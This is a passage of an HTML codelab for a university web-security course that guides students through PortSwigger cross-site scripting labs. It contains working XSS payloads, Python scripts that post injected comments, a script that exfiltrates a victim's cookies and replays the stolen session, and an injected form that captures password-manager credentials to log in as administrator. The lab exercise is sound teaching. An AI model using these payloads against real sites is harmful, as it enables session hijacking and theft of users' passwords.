+<p>Given what has happened, we can then specify a Javascript call as the <code>returnPath</code> parameter and have it be injected into the <code>backLink</code>, causing it to be executed when clicked. Finish the level, by encoding a Javascript call that performs the <code>alert()</code> of the document&#39;s cookie when clicked.</p>
+<pre><code>javascript:alert(document.cookie)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/dom-based (5)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected" target="_blank">dom-xss-reflected</a> </h2>
+<h3 is-upgraded>Initial request</h3>
+<p>The Javascript Object Notation (JSON) is intended to be a data-only format that should never be evaluated as code. Any Javascript code that uses <code>eval()</code> on a JSON object can potentially create a remote-code execution (RCE) vulnerability. Begin by visiting the site and bringing up the Developer Tools console and select the &#34;Network&#34; tab.</p>
+<p class="image-container"><img style="width:509px" src="img/a909918499c6807a.png"></p>
+<p>Copy the title of the first blog post and submit a search for it. To implement the search functionality, the page downloads the Javascript file <code>/resources/js/searchResults.js</code>. It then sends an <code>XMLHTTPRequest</code> (XHR) request, also known as an AJAX request, to the backend server to perform the search, getting a JSON object in response. Find the XHR request, click on it, and view the JSON object in the response.</p>
+<ul>
+<li><strong>Show a screenshot of the URI path of the XHR request</strong></li>
+<li><strong>Show a screenshot of the JSON response that echoes the search term</strong></li>
+</ul>
+<p>Then, click on the &#34;Sources&#34; tab and navigate to <code>searchResults.js</code>. The file defines a <code>search()</code> function that takes a URI path (seen in your prior screenshot) and uses it to submit the XHR HTTP request (also seen in the screenshot). The server returns its response in JSON as is typically done for many web APIs via <code>this.responseText</code>. It performs the request and uses the response to generate the <code>searchResultsObj</code> object. Unfortunately for the client, the script does so by using the <code>eval()</code> function, before passing the object to <code>displaySearchResults()</code> which renders the DOM elements to the user.</p>
+<ul>
+<li><strong>Take a screenshot of the vulnerable line of code</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="8">
+<h3 is-upgraded>Break syntax</h3>
+<p>The JSON response echoes the search term back to the client as part of its response. If we can somehow break syntax and inject Javascript code, the client&#39;s use of <code>eval()</code> will allow us to then execute that code. Examine the format of the search term within JSON and the characters used to delimit it. Attempt to break syntax by performing a search using the delimiter.</p>
+<ul>
+<li><strong>What has been done to the delimiter to prevent syntax from being broken?</strong></li>
+</ul>
+<p>We must make sure any escape character that is used is also escaped out if sent by a user. Repeat the search by sending in an escape character followed by the delimiter.</p>
+<ul>
+<li><strong>Take a screenshot of the error that has been produced in the console. Examine the JSON response to verify that you have broken syntax.</strong></li>
+</ul>
+<h3 is-upgraded>Solve the level</h3>
+<p>Going back to the Javascript, the code will eventually <code>eval()</code> a statement with the format below (with <code>XXX</code> denoting our term that breaks syntax.</p>
+<pre><code>var searchResultsObj = {&#34;searchTerm&#34;:&#34;XXX&#34;,&#34;results&#34;:[]}</code></pre>
+<p>We can then break syntax using the technique above and immediately close out the JSON using <code>};</code> and then call <code>alert()</code>. To ensure the rest of the JSON response is not executed (e.g. <code>","results":[]}</code> ), we can then finish by injecting the Javascript comment characters <code>//</code> .</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/stored (1)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" target="_blank">html-context-nothing-encoded</a></h2>
+<p>Another way to perform a cross-site scripting attack is by leveraging web sites that allow user content to be stored without proper sanitization. This lab contains the canonical stored XSS attack that does so. Within the comments section of the website, one can upload a comment that contains Javascript code. If not properly sanitized, this code will then be executed by any visitor to the site that subsequently accesses the comment. The Python snippet below submits a comment onto the vulnerable site. Fill it in with your name and e-mail address, then run the script and ensure you are able to use it to post a comment on the post with <code>postId=1</code>.</p>
+<pre><code>blog_post_url = f&#39;https://{site}/post?postId=1&#39;
+resp = s.get(blog_post_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+comment_url = f&#39;https://{site}/post/comment&#39;
+comment_string = &#39;&#39;&#39;Hello world!&#39;&#39;&#39;
+comment_data = {
+    &#39;csrf&#39; : csrf,
+    &#39;postId&#39; : &#39;1&#39;,
+    &#39;comment&#39; : comment_string,
+    &#39;name&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;email&#39; : &#39;&lt;FMI&gt;&#39;,
+    &#39;website&#39;: &#39;https://pdx.edu&#39;
+}
+resp = s.post(comment_url, data=comment_data)
+resp = s.get(blog_post_url)
+print(resp.text)</code></pre>
+<p>As with the search term in the previous level, the <code>comment_string</code> can contain Javascript code. When stored, any subsequent user will execute the code. Re-run the Python script and post a comment containing Javascript that creates a pop-up window that emits the session cookie: </p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/stored (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded" target="_blank">href-attribute-double-quotes-html-encoded</a></h2>
+<p>In this lab, when posting a comment, an author is able to provide a URL that is then placed as a link on the site. It is important that this URL be properly encoded to avoid a cross-site-scripting attack. Unfortunately, this level has a vulnerability in that it hasn&#39;t encoded all of the necessary characters to avoid the attack. Navigate the site to find the blog post with <code>postId=1</code>. Using the Python script previously given, repeat the posting of a message that contains <a href="https://pdx.edu" target="_blank">https://pdx.edu</a> as the website attribute for the author in the form submission. Then, scroll down and locate the post that has been submitted and inspect its author link in Developer Tools.</p>
+<p>As the &lt;<code>a</code>&gt; tag shows, a link with an <code>id</code> of <code>author</code> has been created that points to <a href="https://pdx.edu" target="_blank"><code>https://pdx.edu</code></a>. Examine the string delimiters used to denote the URL in the link. If the <code>author_url</code> contains a double-quote, we must make sure our web application encodes it in order to prevent an adversary from escaping out of the URL and into the context of the &lt;<code>a</code>&gt; tag. </p>
+<p>Perform the post again, but attempt to break out into the &lt;<code>a</code>&gt; tag via the use of double-quotes. Fill in the Python snippet below with your OdinId and perform the post.</p>
+<pre>    &#39;website&#39;: &#39;&#39;&#39;https://pdx.edu&#34; OdinId=&#34;&lt;FMI&gt;&#39;&#39;&#39;</pre>
+<p>Reload the blog post and hover over the link. See that the double-quote used has been encoded and that rather than breaking syntax, the OdinId is part of the website link. Inspect the &lt;<code>a</code>&gt; tag in Developer Tools.</p>
+<p class="image-container"><img style="width:624px" src="img/212778fa3c7c4fc7.png"></p>
+<ul>
+<li><strong>Take a screenshot showing that the author&#39;s website link has been protected with appropriate encoding and that the URL contains the OdinId string.</strong></li>
+</ul>
+<p>Another way to have the <code>alert()</code> pop up without breaking syntax in the <code>href</code> attribute is to simply invoke Javascript directly in the link. Set the website attribute to <code>javascript:alert(1)</code> to invoke the pop-up when clicked.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/stored (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped" target="_blank">onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped</a> </h2>
+<h3 is-upgraded>Browser rendering of HTML-encoded content</h3>
+<p>This level requires some knowledge of how the browser renders content. HTML employs characters such as &lt;, &gt;, &#34;, and &#39; to denote tags and delimit their attributes. If an HTML page wishes to use those characters in its content, it must HTML-encode them as <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code>, and <code>&apos</code>; respectively to prevent them from being interpreted as HTML code. A browser will download the page source and parse the HTML tags to create the DOM (Document Object Model) for the page. In filling in the DOM content, it will then HTML-decode any HTML-encoded characters in order to display them on the page. You can see the difference by viewing the first sentence of this web page using the browser&#39;s view page source </p>
+<p class="image-container"><img style="width:624px" src="img/5078be833c527b25.png"></p>
+<p>and then viewing it via the browser&#39;s Developer Tools DOM inspector.</p>
+<p class="image-container"><img style="width:516px" src="img/22938fa40a9c3b8a.png"></p>
+<h3 is-upgraded>Python snippet for posting comments</h3>
+<p>Similar to previous levels, the Python snippet below posts a comment onto the blog post with <code>postId=1</code>. Because we will be posting multiple times in this lab, it has been modified to include a <code>name</code> and a <code>website_link</code> parameter. Modify the snippet with your PSU e-mail addresses and a custom comment.</p>
+<pre><code>def try_post(name, website_link):
+    blog_post_url = f&#39;https://{site}/post?postId=1&#39;
+    resp = s.get(blog_post_url)
+    soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+    csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+    comment_url = f&#39;https://{site}/post/comment&#39;
+    comment_data = {
+        &#39;csrf&#39; : csrf,
+        &#39;postId&#39; : &#39;1&#39;,
+        &#39;comment&#39; : &#39;&lt;FMI&gt;&#39;,
+        &#39;name&#39; : name,
+        &#39;email&#39; : &#39;&lt;FMI&gt;@pdx.edu&#39;,
+        &#39;website&#39;: website_link
+    }
+    resp = s.post(comment_url, data=comment_data)</code></pre>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Initial post</h3>
+<p>Begin by submitting an innocuous comment to examine the Javascript code the site implements.</p>
+<pre><code>try_post(&#34;innocuous&#34;,&#34;https://pdx.edu/&#34;)</code></pre>
+<p>Inspect the comment in Developer Tools. The link appears in two contexts on the page: 1) as part of the <code>a</code> tag&#39;s <code>href</code> attribute and 2) within the single line of Javascript code that is invoked when the link is clicked as defined in the <code>onclick</code> event attribute. The Javascript code instantiates an object called <code>tracker</code> that has one function defined (<code>track()</code>). It then proceeds to invoke the function with the <code>website_link</code> (<a href="https://pdx.edu" target="_blank">https://pdx.edu</a>) given by the user. The goal of the level is to inject an <code>alert</code> using this attribute. Copy this line of code to the clipboard.</p>
+<h3 is-upgraded>Craft an exploit</h3>
+<p>Open up a new tab in the browser and bring up the console in Developer Tools.</p>
+<p class="image-container"><img style="width:624px" src="img/d4a8024c17978689.png"></p>
+<p>Paste the code you have copied directly into the console and execute it. The code should execute without errors as shown in the output below.</p>
+<p class="image-container"><img style="width:614px" src="img/7f237c771cc82f4e.png"></p>
+<p>Within the console, we&#39;ll examine payloads that can be injected via the <code>website_link</code> that can break out of the Javascript string syntax to invoke an <code>alert()</code>. Within the console above, perform the following:</p>
+<ul>
+<li><strong>Replace the URL with </strong><strong><code>https://pdx.edu'</code></strong><strong> (e.g. the original URL with a single-quote added to break Javascript syntax). Execute the code and show a screenshot of the error that is returned.</strong></li>
+</ul>
+<p>The prior URL broke Javascript syntax, causing an error. The goal of this level is to break syntax to invoke the <code>alert()</code> function.</p>
+<ul>
+<li><strong>Explain what happens when the URL is replaced with </strong><strong><code>https://pdx.edu');//</code></strong></li>
+<li><strong>Finally, using this URL, insert an </strong><strong><code>alert(1);</code></strong><strong> into it and take a screenshot of the results in the console including the pop-up</strong></li>
+</ul>
+<p>We will eventually use this payload to solve this level.</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Probe the site</h3>
+<p>Our payload requires that we break syntax using a <code>website_link</code> that includes a single quote. Begin by attempting to do so.</p>
+<pre><code>try_post(&#34;single quote&#34;,&#34;https://pdx.edu/&#39;&#34;)</code></pre>
+<p>Bring up the blog post view its page source and its DOM in Developer Tools. In both cases, the quote has been backslash escaped appropriately, preventing our attempt to break syntax.</p>
+<p>Now try the post using a <code>website_link</code> that includes a double-quote.</p>
+<pre><code>try_post(&#34;double quote&#34;,&#39;https://pdx.edu/&#34;&#39;)</code></pre>
+<p>Bring up the blog post view its page source and its DOM in Developer Tools. </p>
+<ul>
+<li><strong>Explain why they differ</strong></li>
+</ul>
+<p>Next, attempt to send an HTML-encoded double quote as part of the URL.</p>
+<pre><code>try_post(&#34;double quote HTML encoded&#34;,&#39;https://pdx.edu/&amp;quot;&#39;)</code></pre>
+<ul>
+<li><strong>Are the results the same?</strong></li>
+</ul>
+<p>The prior post shows that the HTML-encoded double-quote is allowed by the web application and sent back into both the &lt;<code>a</code>&gt; tag&#39;s <code>href</code> context as well as the Javascript context as data. By performing encoding, injection has been prevented. After being HTML-decoded, the double-quote can be safely included into the Javascript code as literal characters.</p>
+<h3 is-upgraded>Break syntax</h3>
+<p>Both raw double-quotes and HTML-encoded double-quotes are safely included into the page&#39;s contexts before being used in the <code>href</code> containing the link and in the Javascript code for tracking. We have seen that the single quote is escaped by a backslash. What if we inject an HTML-encoded single quote (<code>&apos;</code>)? When included in a comment and accessed, will it be backslash-escaped in the Javascript code to prevent a string escape? Perform the following post and view the post in Developer Tools to find out. </p>
+<pre><code>try_post(&#34;single quote HTML encoded&#34;,&#39;https://pdx.edu/&amp;apos;&#39;)</code></pre>
+<p>Go back to the blog post and navigate to the console in Developer tools. Click on the link and view the errors in the console.</p>
+<ul>
+<li><strong>Take a screenshot of the error message in the console. Is it similar to one that you have seen when crafting an exploit?</strong></li>
+</ul>
+<h3 is-upgraded>Solve the level</h3>
+<p>Based on the exploit created within the console previously, craft a <code>website_link</code> payload that will cause an <code>alert()</code> to be invoked when the link is clicked. Post the exploit comment:</p>
+<pre><code>try_post(&#34;exploit&#34;,&#39;https://pdx.edu/&lt;FMI&gt;&#39;)</code></pre>
+<p>Visit the blog post and click on the link to cause an <code>alert()</code> to occur which solves the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/dom-based (6)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored" target="_blank">dom-xss-stored</a> </h2>
+<p>One of the main counter-measures for cross-site scripting is to ensure that user-controlled content, whether stored or reflected, is HTML-encoded before being rendered by the client browser. One can do this either on the backend server or on the client. Unless the encoding is done properly, however, the vulnerability can still exist. In this level, the comments for a blog post are retrieved by client-side Javascript using a REST-like API. The site includes a Javascript routine that attempts to HTML-encode the comments that are retrieved so that when they are rendered by the client browser, no cross-site scripting is possible.</p>
+<h3 is-upgraded>Javascript preliminaries</h3>
+<p>Begin by bringing up the Developer Tools console on a new browser tab. Create an HTML tag out of your OdinId and place it in a Javascript string (e.g. &#34;&lt;wuchang&gt;&#34;). Hit return to see it echoed back.</p>
+<p>If this string were included in a comment, the tag would be interpreted as HTML by the client browser. To prevent this, one might use the <code>replace()</code> call to encode the HTML tag character &lt; as <code>&lt;</code> . Using your OdinId, evaluate the following and examine the result.</p>
+<pre><code>&#34;&lt;OdinId&gt;&#34;.replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;)</code></pre>
+<p>Since we&#39;ll want to encode both HTML tag characters to prevent syntax from breaking, we can take the results of the first replacement and go through it again to replace the <code>></code> with <code>&gt;</code> .</p>
+<pre><code>&#34;&lt;OdinId&gt;&#34;.replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;)</code></pre>
+<p>Using the code above, perform the replacements using the string below:</p>
+<pre><code>&#34;&lt;OdinId&gt;&lt;img src=1 onerror=alert(1)&gt;&#34;</code></pre>
+<ul>
+<li><strong>Take a screenshot of the result and explain the issue. What other </strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String" target="_blank"><strong>built-in String method</strong></a><strong> could be used instead to fix this particular issue?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="8">
+<h3 is-upgraded>Vulnerable code</h3>
+<p>Visit the site and click on a post. Scroll down to see the contents of the Comments section. Then, &#34;View page source&#34; to see the original HTML before it has been rendered. You should see two &lt;<code>script</code>&gt; tags that implement this section. The first tag includes a Javascript file the browser needs to download and the second tag invokes a function within that file to dynamically retrieve the comments for the blog post.</p>
+<p>Inspect the Comments section of the page in Developer Tools and, under the &#34;Elements&#34; tab, see each comment <code>section</code> that has been added to the DOM after the client has executed the downloaded Javascript. Visit the &#34;Sources&#34; tab and bring up the Javascript file. The file implements the <code>loadComments()</code> function which defines two other functions: <code>escapeHTML()</code> and <code>displayComments()</code>. Examine <code>escapeHTML()</code> to see how it is attempting to perform HTML-encoding and identify the vulnerability.</p>
+<p>In order to exploit the vulnerability, we need to examine the rest of the code. The first part of the <code>loadComments()</code> function performs the AJAX request which retrieves the comment data for the post via <code>xhr.send()</code>. It then parses the JSON response via <code>JSON.parse()</code>before calling <code>displayComments()</code> to construct the DOM (e.g. <code>section</code>) elements for each comment. Within displayComments(), a loop that iterates through the comments JSON is implemented. The function calls <code>escapeHTML()</code> to ensure no &lt; or &gt; characters are left unencoded. Answer the following question for your lab notebook.</p>
+<ul>
+<li><strong>Which three fields of JSON are vulnerable to a cross-site scripting attack?</strong></li>
+</ul>
+<p>Submit a comment that leverages one of the fields to perform the <code>alert()</code>. Note that &lt;<code>script</code>&gt; tags created after the initial page load are not executed automatically and can not be used to solve the level</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/exploiting (1)" duration="8">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies" target="_blank">stealing-cookies</a> </h2>
+<p>Popping up <code>alert()</code> boxes might be fun, but if that&#39;s all one could do with XSS, it would be pretty lame. The ability for the adversary to execute arbitrary Javascript on the victim gives the adversary ownership of the victim&#39;s browser. In this level, we will craft an exploit that uses a cross-site script to exfiltrate a victim&#39;s HTTP cookie.</p>
+<h3 is-upgraded>Exfiltration script</h3>
+<p>This level would ideally be solved via a stealthier form of exfiltration using a domain name and web site we control. For expediency, we will simply exfiltrate the cookie by tricking the victim to execute a script that posts it as a comment back onto the site. Consider the Javascript code below.</p>
+<pre><code>comment_xss = &#39;&#39;&#39;&#39;&lt;script&gt;                                                                        
+  document.addEventListener(&#34;DOMContentLoaded&#34;, function() {                      
+  document.forms[0].name.value = &#39;&lt;FMI&gt;&#39;;                                           
+  document.forms[0].email.value = &#39;&lt;FMI&gt;@pdx.edu&#39;;                                
+  document.forms[0].postId.value = 1;                                           
+  document.forms[0].csrf.value = document.getElementsByName(&#39;csrf&#39;)[0].value;   
+  document.forms[0].comment.value = document.cookie;                            
+  document.forms[0].website.value = &#39;https://pdx.edu&#39;;                          
+  document.forms[0].submit();                                                   
+});                                                                             
+&lt;/script&gt;&#39;&#39;&#39;</code></pre>
+<p>If injected onto a page that the victim loads, it registers an Event Listener that will force a victim to execute a function when the page is loaded. The script accesses the form on the blog post (<code>document.forms[0]</code>) and automatically fills out its fields. Notably, the script needs to:</p>
+<ul>
+<li>Access the CSRF token that has been supplied by the server and can be accessed in the DOM after the page has been loaded (e.g. <code>document.getElementsByName('csrf')[0].value</code>)</li>
+<li>Access the cookie that the victim used to access the site (e.g. <code>document.cookie</code>). Note that this type of access would be disallowed if the cookie were set to be <code>HttpOnly</code></li>
+<li>Submit the form automatically (e.g. <code>document.forms[0].submit()</code> ). In this case, the comment will be submitted onto <code>postId=1</code>.</li>
+</ul>
+<p>Modify the script to fill in your own name and email in the fields of the form.</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Upload exploit and test</h3>
+<p>Modify the prior <code>try_post()</code> function to post the exfiltration script as its comment. For this level, a victim periodically visits each blog post. Once the script has been placed into the comments, the victim&#39;s cookie will automatically be posted into the comment section of <code>postId=1</code>. Perform the post and pause for a minute. Then, bring up Developer Tools and visit the blog post. The comment you have uploaded should cause you to immediately submit a comment, forcing you to become a victim yourself and posting your cookie onto the site. Within Developer Tools, bring up the &#34;Network&#34; tab and click on the request.</p>
+<p class="image-container"><img style="width:624px" src="img/9f2f5efe526a2bd6.png"></p>
+<ul>
+<li><strong>Take a screenshot of the headers showing all of the form data for your POST including your own exfiltrated cookie sent as a comment.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="5">
+<h3 is-upgraded>Solve the level</h3>
+<p>Along with the <code>session</code> cookie, the victim cookie also contains a <code>secret</code> cookie. The goal of the level is to steal both and then access the web site impersonating the victim by using the stolen cookies. </p>
+<p>One way to solve the level is via the browser. We can access the blog post containing the victim&#39;s cookie and then stop the browser before it submits the comment. We could also disable Javascript before loading the page in order to get the cookie data. After obtaining the values, the level could then be solved by editing the cookie fields in our session via the browser&#39;s Developer Tools and accessing the site again.</p>
+<p>Alternatively, we can grab the content of the blog post via Python, parse out the cookies, and then access the site with them. When accessing the comment, the exfiltrated cookies will be disclosed in a <code>p</code> element that is used to display comments in the format below:</p>
+<pre><code>&lt;p&gt;secret=gnP6...eM; session=JaUY...xa&lt;/p&gt;</code></pre>
+<p>The script below accesses the blog post and then searches for a &lt;<code>p</code>&gt; tag that has, in its text, the string &#39;<code>secret</code>&#39;. Note that the search is done via regular expression (e.g. <code>text=re.compile('secret')</code>) so we must <code>import re</code> as part of our script. We then take the text contents and split it using the semicolon that separates the two cookie values, producing a list of strings. Run the code on the post and ensure that it produces the victim&#39;s cookies.</p>
+<pre><code>resp = s.get(post_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+cookie_list = soup.find(&#39;p&#39;, text=re.compile(&#39;secret&#39;)).text.split(&#39;;&#39;)
+print(cookie_list)</code></pre>
+<p>In the Python requests package, we specify a session&#39;s cookies using a dictionary. From the array of <code>key=value</code> pairs that the <code>cookie_list</code> provides, we can split each pair using the <code>=</code> character, then set <code>cookie_dict['key']</code> to <code>'value'</code>. We then use the keyword argument <code>cookies</code> to attach the <code>cookie_dict</code> when accessing the site to solve the level.</p>
+<pre><code>cookie_dict = dict()
+for cookie in cookie_list:
+    c = cookie.split(&#39;=&#39;)
+    cookie_dict[c[0]] = c[1]
+print(cookie_dict)
+resp = s.get(f&#39;https://{site}&#39;,cookies=cookie_dict)</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="cross-site-scripting/exploiting (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords" target="_blank">capturing-passwords</a> </h2>
+<p>Password managers can be used to automatically fill-in form fields with stored usernames and passwords. Unfortunately, a site that contains a cross-site scripting vulnerability can be used to steal them in a similar manner as the prior level.</p>
+<h3 is-upgraded>Inject form fields</h3>
+<p>As before, the comment field allows us to inject HTML that contains Javascript code. Use the code from the prior level to inject a comment that implements <code>input</code> elements for <code>username</code> and <code>password</code> fields.</p>
+<pre><code>comment_xss = &#39;&#39;&#39;&lt;input name=username id=username&gt;
+                 &lt;input type=password name=password&gt;&#39;&#39;&#39;</code></pre>
+<p>View the blog post to see the form in your posted comment.</p>
+<h3 is-upgraded>Craft exploit using event handler</h3>
+<p>The &lt;<code>input</code>&gt; tag supports an <code>onchange</code> <a href="https://www.w3schools.com/jsref/event_onchange.asp" target="_blank">event handler</a> that allows one to specify Javascript code to run when content is entered (as it would when the password is filled in). Consider the Javascript snippet below:</p>
+<pre><code>document.forms[0].email.value=&#39;&lt;FMI&gt;@pdx.edu&#39;;
+document.forms[0].name.value=&#39;&lt;FMI&gt;&#39;;
+document.forms[0].comment.value=username.value+&#39;:&#39;+this.value;
+document.forms[0].website=&#39;https://pdx.edu&#39;;
+document.forms[0].submit();</code></pre>
+<p>As before, it automatically fills in the form fields for comment submission and submits it. In this case, the script fills in the comment field with the content of the <code>username</code> element (<code>username.value</code>) and the content of the current element (<code>this.value</code>). When this script is associated with the <code>password</code> field&#39;s <code>onchange</code> handler, <code>this.value</code> will contain the contents of the <code>password</code> field that has changed. Modify the snippet to include your <code>name</code> and <code>email</code>, then create a <code>comment_xss</code> that invokes the script when the password field changes. Post the comment onto the site. Note that, unlike injecting Javascript within an HTML context, you are injecting into an attribute that can take Javascript code directly. Thus, you do not need to specify &lt;<code>script</code>&gt; tags as before, as shown below:</p>
+<pre><code>comment_xss =
+  &#39;&#39;&#39;&lt;input name=username id=username&gt;
+     &lt;input type=password name=password 
+            onchange=&#34;docuent.forms[0].email.value=&#39;wuchang@pdx.edu&#39;; ... document.forms[0].submit();&#34;&gt;&#39;&#39;&#39;</code></pre>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h3 is-upgraded>Solve the level</h3>
+<p>Visit the blog post that you&#39;ve uploaded your exploit to. The <code>administrator</code> for the site is programmed to visit the post with a password manager that automatically fills in form fields on the site labeled <code>username</code> and <code>password</code> (as we have crafted in our comment). Use the credentials to login and solve the level. Alternatively, the following snippet can be used to solve the level programmatically by parsing the blog post and performing the login.</p>
+<pre><code>resp = s.get(post_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+credentials = soup.find(&#39;p&#39;, text=re.compile(&#39;administrator&#39;)).text.split(&#39;:&#39;)
+print(credentials)
+login_url = f&#39;https://{site}/login&#39;
+resp = s.get(login_url)
+soup = BeautifulSoup(resp.text,&#39;html.parser&#39;)
+csrf = soup.find(&#39;input&#39;, {&#39;name&#39;:&#39;csrf&#39;}).get(&#39;value&#39;)
+
+logindata = {
+    &#39;csrf&#39; : csrf,
+    &#39;username&#39; : &#39;administrator&#39;,
+    &#39;password&#39; : credentials[1]
+}
+resp = s.post(login_url, data=logindata)</code></pre>
+<p>Note that the &#34;victim&#34; for the level periodically visits the site, but only fills in the first username, password field it comes across. If you have uploaded prior attempts that were incorrect, you will need to wait for the level to time-out and try again with the working exploit.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId </strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
